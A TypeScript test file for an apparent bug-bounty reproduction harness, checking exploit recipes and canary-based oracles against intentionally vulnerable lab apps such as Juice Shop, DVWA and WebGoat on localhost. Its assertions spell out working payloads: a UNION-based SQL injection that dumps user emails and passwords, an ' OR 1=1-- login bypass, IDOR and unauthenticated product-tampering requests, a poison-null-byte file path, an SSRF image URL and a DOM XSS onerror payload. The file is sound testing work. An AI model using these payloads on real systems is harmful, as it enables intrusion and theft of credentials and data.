import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import test from "node:test";

import { getRecipesForTarget } from "./recipes";
import { recipeOracleReady } from "./authorize-reproduction";

const CONFIG = {
  baseUrl: "http://localhost:3000",
  searchPath: "/rest/products/search",
  canaryRegistrationPath: "/api/Users/",
};

function freshCanary(): string {
  return `${randomBytes(12).toString("base64url")}@bountydesk.test`;
}

test("an unrecognized target name gets no recipes", () => {
  assert.deepEqual(getRecipesForTarget({ name: "some-other-target", config: CONFIG }), []);
});

test("a recognized target name with an unrecognized config shape gets no recipes", () => {
  assert.deepEqual(
    getRecipesForTarget({ name: "juice-shop-v17.3.0", config: { searchPath: 1 } }),
    [],
  );
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: null }), []);
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: "nope" }), []);
});

test("juice-shop-v17.3.0 returns the six HTTP/OOB recipes and the DOM XSS recipe", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  assert.deepEqual(
    recipes.map((r) => r.id),
    [
      "juice-shop-sqli-search",
      "juice-shop-login-bypass",
      "juice-shop-idor-basket",
      "juice-shop-product-tampering-unauth",
      "juice-shop-ftp-poison-null-byte",
      "juice-shop-ssrf-profile-image",
      "juice-shop-dom-xss-search",
    ],
  );
});

test("the DOM XSS recipe carries a title-sink browserExploit with the canary only in the fragment", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const domXss = recipes.find((r) => r.id === "juice-shop-dom-xss-search");
  assert.ok(domXss?.browserExploit, "the recipe has a browserExploit leg, not an HTTP oracle");
  const leg = domXss.browserExploit;
  assert.equal(leg.sink, "title");
  // The payload rides only in the fragment (hashPayload); the server-visible path is the app shell.
  assert.equal(leg.exploit.path, "/");
  assert.equal(leg.negativeControl.path, "/");
  // The exploit sets document.title to the run canary; the negative control carries it inertly.
  assert.match(leg.exploit.hashPayload, /onerror=.*document\.title='\{\{canary\}\}'/);
  assert.ok(leg.negativeControl.hashPayload.includes("{{canary}}"));
  assert.doesNotMatch(leg.negativeControl.hashPayload, /onerror|<img/, "the control is inert");
  // The canary must never appear in the HTTP path or a request body (it would reach the server).
  assert.equal(leg.exploit.path.includes("{{canary}}"), false);
});

test("the registration fixture matches decisions.md Q18 exactly", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  // The browser recipe carries a dummy fixture it never runs (reproduce.ts uses its browserExploit
  // leg instead), so the shared-fixture check is only for the HTTP recipes.
  for (const recipe of recipes.filter((r) => !r.browserExploit)) {
    assert.deepEqual(recipe.fixture.request, {
      method: "POST",
      path: "/api/Users/",
      body: {
        email: "{{canary}}",
        password: "bd-fixture-Only1!",
        passwordRepeat: "bd-fixture-Only1!",
      },
    });
  }
});

test("sqli-search negative control and exploit match decisions.md Q18 exactly", () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });

  assert.deepEqual(sqli.negativeControl, {
    method: "GET",
    path: "/rest/products/search?q=apple",
  });

  // The frozen payload, percent-encoded as a query-string value. Computed independently here
  // (not by calling encodeURIComponent on the same literal the recipe uses) so this test would
  // actually catch a change to either side.
  assert.deepEqual(sqli.exploit, {
    method: "GET",
    path:
      "/rest/products/search?q=qwert'))%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C" +
      "'4'%2C'5'%2C'6'%2C'7'%2C'8'%2C'9'%20FROM%20Users--",
  });
});

test("sqli-search oracle: canary in the injected email field (returned as \"name\") is true", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [
      { id: 1, name: "Apple Juice", description: "Real product, no canary here" },
      { id: 2, name: canary, description: "$2a$hashedpassword" },
    ],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), true);
});

test("sqli-search oracle: canary absent from every row is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: "nothing here" }],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: canary as a coincidental substring outside the name field is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  // The canary shows up verbatim in the response -- in the injected password column (which the
  // UNION returns under "description", not "name") and in a top-level field entirely outside
  // any row. A substring search over the raw body would wrongly call this reproduced.
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: canary }],
    debugNote: canary,
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: a non-JSON body does not throw and is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  assert.equal(await sqli.oracleCheck({ status: 500, body: "<html>not json</html>" }, canary), false);
});

test("sqli-search oracle: a JSON error response containing the canary is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({ data: [{ name: canary }] });

  assert.equal(await sqli.oracleCheck({ status: 500, body }, canary), false);
});

function loginBypassRecipe() {
  const [, loginBypass] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  return loginBypass;
}

test("login-bypass negative control and exploit match decisions.md Q18 exactly", () => {
  const recipe = loginBypassRecipe();

  assert.deepEqual(recipe.negativeControl, {
    method: "POST",
    path: "/rest/user/login",
    body: { email: "{{canary}}", password: "definitely-the-wrong-password" },
  });
  assert.deepEqual(recipe.negativeControlAcceptedStatuses, [401]);

  assert.deepEqual(recipe.exploit, {
    method: "POST",
    path: "/rest/user/login",
    body: { email: "' OR 1=1--", password: "x" },
  });
});

test("login-bypass negative-control oracle: a rejected login (no token) is false", () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({ status: 401, message: "Invalid email or password" });

  assert.equal(recipe.oracleCheck({ status: 401, body }, canary), false);
});

test("login-bypass negative-control oracle: a token in the response is true", () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({ authentication: { token: "a.jwt.token", bid: 1, umail: canary } });

  assert.equal(recipe.oracleCheck({ status: 200, body }, canary), true);
});

test("login-bypass follow-up: buildRequest extracts the token as a Bearer header against /api/Users", () => {
  const recipe = loginBypassRecipe();
  const exploitResponse = {
    status: 200,
    body: JSON.stringify({ authentication: { token: "minted-jwt", bid: 1, umail: "admin@juice-sh.op" } }),
  };

  assert.deepEqual(recipe.exploitFollowUp?.buildRequest(exploitResponse), {
    method: "GET",
    path: "/api/Users",
    headers: { Authorization: "Bearer minted-jwt" },
  });
});

test("login-bypass follow-up: buildRequest returns undefined when the exploit minted no token", () => {
  const recipe = loginBypassRecipe();

  assert.equal(
    recipe.exploitFollowUp?.buildRequest({ status: 401, body: JSON.stringify({ message: "Invalid email or password" }) }),
    undefined,
  );
  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: "not json" }), undefined);
  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: JSON.stringify({}) }), undefined);
});

test("login-bypass follow-up oracle: this run's canary in /api/Users proves the token grants access", async () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [
      { id: 1, email: "admin@juice-sh.op", role: "admin" },
      { id: 2, email: canary, role: "customer" },
    ],
  });

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), true);
});

test("login-bypass follow-up oracle: a token that opens /api/Users but without this run's canary is false", async () => {
  // This is exactly the case the withheld "was any token minted" check couldn't distinguish:
  // a real admin dump came back, but not proven to be *this run's* canary-linked proof.
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, email: "admin@juice-sh.op", role: "admin" }],
  });

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), false);
});

test("login-bypass follow-up oracle: a non-JSON /api/Users response does not throw and is false", async () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: "<html>nope</html>" }, canary), false);
});

function idorBasketRecipe() {
  const recipe = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG }).find(
    (r) => r.id === "juice-shop-idor-basket",
  );
  assert.ok(recipe);
  return recipe;
}

test("idor-basket setup captures two principals, seeds a canary-tagged basket item for B, and pits A's own basket against B's", () => {
  const recipe = idorBasketRecipe();
  assert.equal(recipe.setup?.length, 5);

  // Step 0: login as principal B (seeded by the fixture) and capture victimToken + victimBasketId.
  const step0 = recipe.setup![0];
  const loginRespB = {
    status: 200,
    body: JSON.stringify({ authentication: { token: "tok-b", bid: 6, umail: "b@bountydesk.test" } }),
  };
  assert.equal(step0.capture?.victimToken(loginRespB), "tok-b");
  assert.equal(step0.capture?.victimBasketId(loginRespB), "6");
  assert.equal(step0.capture?.victimBasketId({ status: 200, body: "not-json" }), undefined);

  // Step 1: update Product 1's description to {{canary}} via PUT /api/Products/1.
  assert.deepEqual(recipe.setup![1].request, {
    method: "PUT",
    path: "/api/Products/1",
    body: { description: "{{canary}}" },
  });

  // Step 2: add Product 1 to B's basket.
  assert.deepEqual(recipe.setup![2].request, {
    method: "POST",
    path: "/api/BasketItems",
    headers: { Authorization: "Bearer {{victimToken}}" },
    body: { ProductId: 1, BasketId: "{{victimBasketId}}", quantity: 1 },
  });

  // Step 4: login as principal A (registered in step 3) and capture attackerToken + attackerBasketId.
  const step4 = recipe.setup![4];
  const loginRespA = {
    status: 200,
    body: JSON.stringify({ authentication: { token: "tok-a", bid: 7, umail: "second-b@bountydesk.test" } }),
  };
  assert.equal(step4.capture?.attackerToken(loginRespA), "tok-a");
  assert.equal(step4.capture?.attackerBasketId(loginRespA), "7");

  assert.deepEqual(recipe.negativeControl, {
    method: "GET",
    path: "/rest/basket/{{attackerBasketId}}",
    headers: { Authorization: "Bearer {{attackerToken}}" },
  });
  assert.deepEqual(recipe.exploit, {
    method: "GET",
    path: "/rest/basket/{{victimBasketId}}",
    headers: { Authorization: "Bearer {{attackerToken}}" },
  });
});

test("idor-basket oracle: canary in a returned basket product description is true; empty or other-field is false", async () => {
  const recipe = idorBasketRecipe();
  const canary = freshCanary();

  const victimBasketBody = JSON.stringify({
    status: "success",
    data: {
      id: 6,
      Products: [{ id: 42, name: "bd-idor-item", description: canary }],
    },
  });
  assert.equal(await recipe.oracleCheck({ status: 200, body: victimBasketBody }, canary), true);

  const attackerBasketBody = JSON.stringify({
    status: "success",
    data: { id: 7, Products: [] },
  });
  assert.equal(await recipe.oracleCheck({ status: 200, body: attackerBasketBody }, canary), false);

  // Coincidental canary outside Products[].description is ignored.
  const coincidentalBody = JSON.stringify({
    status: "success",
    data: { id: 7, coupon: canary, Products: [{ id: 1, name: canary, description: "Apple Juice" }] },
  });
  assert.equal(await recipe.oracleCheck({ status: 200, body: coincidentalBody }, canary), false);
  assert.equal(await recipe.oracleCheck({ status: 500, body: victimBasketBody }, canary), false);
});

function productTamperingRecipe() {
  const recipe = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG }).find(
    (r) => r.id === "juice-shop-product-tampering-unauth",
  );
  assert.ok(recipe);
  return recipe;
}

test("product-tampering is registered, oracle-ready, and carries the auth-bypass keywords and endpoint path", () => {
  const recipe = productTamperingRecipe();
  assert.equal(recipeOracleReady(recipe), true);
  for (const keyword of ["auth bypass", "broken access control", "missing authentication", "/api/Products"]) {
    assert.ok(recipe.keywords.includes(keyword), `keywords include ${keyword}`);
  }
  // Must not take the SQLi login recipe's own endpoint or class keywords.
  assert.equal(recipe.keywords.includes("sql injection"), false);
  assert.equal(recipe.keywords.includes("/rest/user/login"), false);
});

test("product-tampering exploit is an unauthenticated PUT to product 1; the control is an unauthenticated PUT to a denyAll route", () => {
  const recipe = productTamperingRecipe();

  assert.deepEqual(recipe.exploit, {
    method: "PUT",
    path: "/api/Products/1",
    body: { description: "{{canary}}" },
  });
  assert.equal(recipe.exploit.headers, undefined, "the exploit sends no Authorization header");

  assert.deepEqual(recipe.negativeControl, {
    method: "PUT",
    path: "/api/Users/1",
    body: { email: "{{canary}}" },
  });
  assert.deepEqual(recipe.negativeControlAcceptedStatuses, [401]);
});

test("product-tampering follow-up is an unauthenticated GET of the same product", () => {
  const recipe = productTamperingRecipe();
  const exploitResponse = { status: 200, body: JSON.stringify({ status: "success", data: { id: 1 } }) };

  assert.deepEqual(recipe.exploitFollowUp?.buildRequest(exploitResponse), {
    method: "GET",
    path: "/api/Products/1",
  });
});

test("product-tampering oracle: a response carrying the canary is true, without it is false, and a non-2xx is false", () => {
  const recipe = productTamperingRecipe();
  const canary = freshCanary();

  assert.equal(recipe.oracleCheck({ status: 200, body: JSON.stringify({ data: { description: canary } }) }, canary), true);
  assert.equal(recipe.oracleCheck({ status: 200, body: JSON.stringify({ data: { description: "x" } }) }, canary), false);
  assert.equal(recipe.oracleCheck({ status: 401, body: canary }, canary), false);
});

test("product-tampering follow-up oracle: this run's canary as the product description is true; otherwise false", async () => {
  const recipe = productTamperingRecipe();
  const canary = freshCanary();
  const persisted = JSON.stringify({ status: "success", data: { id: 1, name: "Apple Juice", description: canary } });
  const bare = JSON.stringify({ id: 1, name: "Apple Juice", description: canary });
  const untouched = JSON.stringify({ status: "success", data: { id: 1, name: "Apple Juice", description: "Apple juice" } });

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: persisted }, canary), true);
  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: bare }, canary), true);
  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: untouched }, canary), false);
  // A canary echoed outside the description is not the product's own content.
  assert.equal(
    await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: JSON.stringify({ data: { id: 1, name: canary } }) }, canary),
    false,
  );
  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 403, body: persisted }, canary), false);
  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: "<html>nope</html>" }, canary), false);
});

function ftpPoisonNullByteRecipe() {
  const recipe = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG }).find(
    (r) => r.id === "juice-shop-ftp-poison-null-byte",
  );
  assert.ok(recipe);
  return recipe;
}

test("ftp-poison-null-byte negative control and exploit paths", () => {
  const recipe = ftpPoisonNullByteRecipe();
  assert.deepEqual(recipe.negativeControl, {
    method: "GET",
    path: "/ftp/legal.md",
  });
  assert.deepEqual(recipe.exploit, {
    method: "GET",
    path: "/ftp/package.json.bak%2500.md",
  });
});

test("ftp-poison-null-byte oracle: package.json.bak content is true; legal.md or error is false", async () => {
  const recipe = ftpPoisonNullByteRecipe();
  const canary = freshCanary();

  const backupPkg = JSON.stringify({
    name: "juice-shop",
    version: "6.2.0-SNAPSHOT",
    description: "An intentionally insecure JavaScript Web Application",
  });
  assert.equal(await recipe.oracleCheck({ status: 200, body: backupPkg }, canary), true);
  assert.equal(await recipe.oracleCheck({ status: 200, body: "# Legal Information\n..." }, canary), false);
  assert.equal(await recipe.oracleCheck({ status: 200, body: JSON.stringify({ name: "other" }) }, canary), false);
  assert.equal(await recipe.oracleCheck({ status: 403, body: backupPkg }, canary), false);
});

test("ssrf-profile-image recipe configures an oobListener, captures userToken, and sends {{oobUrl}}/{{canary}}.jpg", () => {
  const recipe = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG }).find(
    (r) => r.id === "juice-shop-ssrf-profile-image",
  );
  assert.ok(recipe);
  assert.deepEqual(recipe.oobListener, { port: 8080 });
  assert.equal(recipe.setup?.length, 1);
  assert.deepEqual(recipe.negativeControl, {
    method: "GET",
    path: "/profile",
    headers: { Cookie: "token={{userToken}}" },
  });
  assert.deepEqual(recipe.negativeControlAcceptedStatuses, [302]);
  assert.deepEqual(recipe.exploit, {
    method: "POST",
    path: "/profile/image/url",
    headers: { Cookie: "token={{userToken}}" },
    body: { imageUrl: "{{oobUrl}}/{{canary}}.jpg" },
  });
});

// The four onboarding targets beyond juice-shop. These validate the recipe lookup and each
// oracle's parsing against synthetic responses, the same way the juice-shop cases above do; no
// live target is involved. The delivery gaps each recipe documents (form-encoding, GET/header
// canary substitution, the out-of-band Log4Shell oracle) are orchestrator work, not recipe work,
// and are tracked in docs/additional-targets.md.

const DVWA_CONFIG = { baseUrl: "http://localhost:80", commandInjectionPath: "/vulnerabilities/exec/" };
const WEBGOAT_CONFIG = {
  baseUrl: "http://localhost:8080",
  sqlInjectionPath: "/WebGoat/SqlInjection/assignment5a",
};
const DSVW_CONFIG = { baseUrl: "http://localhost:65412", sqlInjectionPath: "/" };
const LOG4SHELL_CONFIG = {
  baseUrl: "http://localhost:8080",
  injectionPath: "/",
  injectionHeader: "X-Api-Version",
};

function onlyRecipe(name: string, config: unknown) {
  const recipes = getRecipesForTarget({ name, config });
  assert.equal(recipes.length, 1, `${name} should resolve exactly one recipe`);
  return recipes[0];
}

test("each onboarding target resolves its one recipe by name and config", () => {
  assert.equal(onlyRecipe("dvwa", DVWA_CONFIG).id, "dvwa-command-injection");
  assert.equal(onlyRecipe("webgoat", WEBGOAT_CONFIG).id, "webgoat-sqli-lesson");
  assert.equal(onlyRecipe("dsvw", DSVW_CONFIG).id, "dsvw-sqli");
  assert.equal(onlyRecipe("log4shell-cve-lab", LOG4SHELL_CONFIG).id, "log4shell-jndi");
});

test("an onboarding target with a config missing its recipe's fields gets no recipes", () => {
  assert.deepEqual(getRecipesForTarget({ name: "dvwa", config: { baseUrl: "http://localhost:80" } }), []);
  assert.deepEqual(getRecipesForTarget({ name: "webgoat", config: null }), []);
  assert.deepEqual(getRecipesForTarget({ name: "dsvw", config: "nope" }), []);
  assert.deepEqual(
    getRecipesForTarget({ name: "log4shell-cve-lab", config: { baseUrl: "http://localhost:8080" } }),
    [],
  );
});

test("every onboarding recipe carries the canary placeholder in its exploit", () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  assert.ok(JSON.stringify(dvwa.exploit.body).includes("{{canary}}"));

  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  assert.ok(JSON.stringify(webgoat.exploit.body).includes("{{canary}}"));

  // DSVW and Log4Shell carry the placeholder in the path/header, where the orchestrator does not
  // substitute it yet; the placeholder is kept so the recipe is already correct once it does.
  const dsvw = onlyRecipe("dsvw", DSVW_CONFIG);
  assert.ok(dsvw.exploit.path.includes(encodeURIComponent("{{canary}}")));

  const log4shell = onlyRecipe("log4shell-cve-lab", LOG4SHELL_CONFIG);
  assert.ok(log4shell.exploit.headers?.["X-Api-Version"]?.includes("{{canary}}"));
});

test("dvwa oracle: the canary in command output (a <pre> block) is true", async () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  const canary = freshCanary();
  const body = `<div>ping</div><pre>PING 127.0.0.1: 56 data bytes\n${canary}\n</pre>`;
  assert.equal(await dvwa.oracleCheck({ status: 200, body }, canary), true);
});

test("dvwa oracle: the canary only outside any <pre> block is false", async () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  const canary = freshCanary();
  // A page that reflected our submitted command but never ran it: canary is present, but not in
  // command output.
  const body = `<p>You entered: 127.0.0.1; echo ${canary}</p><pre>PING 127.0.0.1</pre>`;
  assert.equal(await dvwa.oracleCheck({ status: 200, body }, canary), false);
});

test("dvwa oracle: a non-200 response is false even if it contains the canary", async () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  const canary = freshCanary();
  assert.equal(await dvwa.oracleCheck({ status: 302, body: `<pre>${canary}</pre>` }, canary), false);
});

test("webgoat oracle: the canary in the lesson output field is true", async () => {
  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  const canary = freshCanary();
  const body = JSON.stringify({ lessonCompleted: true, feedback: "well done", output: `<table><tr><td>${canary}</td></tr></table>` });
  assert.equal(await webgoat.oracleCheck({ status: 200, body }, canary), true);
});

test("webgoat oracle: the canary only in feedback, not output, is false", async () => {
  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  const canary = freshCanary();
  const body = JSON.stringify({ lessonCompleted: false, feedback: `no rows for ${canary}`, output: "" });
  assert.equal(await webgoat.oracleCheck({ status: 200, body }, canary), false);
});

test("webgoat oracle: the canary only in the echoed query suffix is false", async () => {
  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  const canary = freshCanary();
  const body = JSON.stringify({ output: `incompatible data types<br> Your query was: SELECT '${canary}'` });
  assert.equal(await webgoat.oracleCheck({ status: 200, body }, canary), false);
});

test("webgoat oracle: a non-JSON body does not throw and is false", async () => {
  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  const canary = freshCanary();
  assert.equal(await webgoat.oracleCheck({ status: 200, body: "<html>not json</html>" }, canary), false);
});

test("dsvw oracle: the canary reflected in the response is true, absent is false", async () => {
  const dsvw = onlyRecipe("dsvw", DSVW_CONFIG);
  const canary = freshCanary();
  assert.equal(await dsvw.oracleCheck({ status: 200, body: `<div>user: ${canary}</div>` }, canary), true);
  assert.equal(await dsvw.oracleCheck({ status: 200, body: "<div>user: admin</div>" }, canary), false);
});

test("log4shell oracle: the in-band canary echo is true, a non-200 is false", async () => {
  const log4shell = onlyRecipe("log4shell-cve-lab", LOG4SHELL_CONFIG);
  const canary = freshCanary();
  assert.equal(await log4shell.oracleCheck({ status: 200, body: `resolved ${canary}` }, canary), true);
  assert.equal(await log4shell.oracleCheck({ status: 500, body: canary }, canary), false);
});

// Oracle-readiness gate. A not-ready recipe must fall to the same no-approved-oracle path an
// unknown recipe does, so a run against any of the four onboarding targets is provably
// ANALYSIS_ONLY today and a false REPRODUCED is structurally impossible. authorizeReproduction-
// Target applies recipeOracleReady after looking the recipe up; that lookup and this predicate
// are exactly the gate, and both are exercised here without touching the database.
test("the still-unbuilt onboarding recipes are gated not-oracle-ready", () => {
  assert.equal(recipeOracleReady(onlyRecipe("dvwa", DVWA_CONFIG)), false);
  assert.equal(recipeOracleReady(onlyRecipe("webgoat", WEBGOAT_CONFIG)), false);
  assert.equal(recipeOracleReady(onlyRecipe("log4shell-cve-lab", LOG4SHELL_CONFIG)), false);
});

test("dsvw is oracle-ready now that it is built and onboarded", () => {
  assert.equal(recipeOracleReady(onlyRecipe("dsvw", DSVW_CONFIG)), true);
});

test("juice-shop recipes stay oracle-ready", () => {
  for (const recipe of getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG })) {
    assert.equal(recipeOracleReady(recipe), true);
  }
});
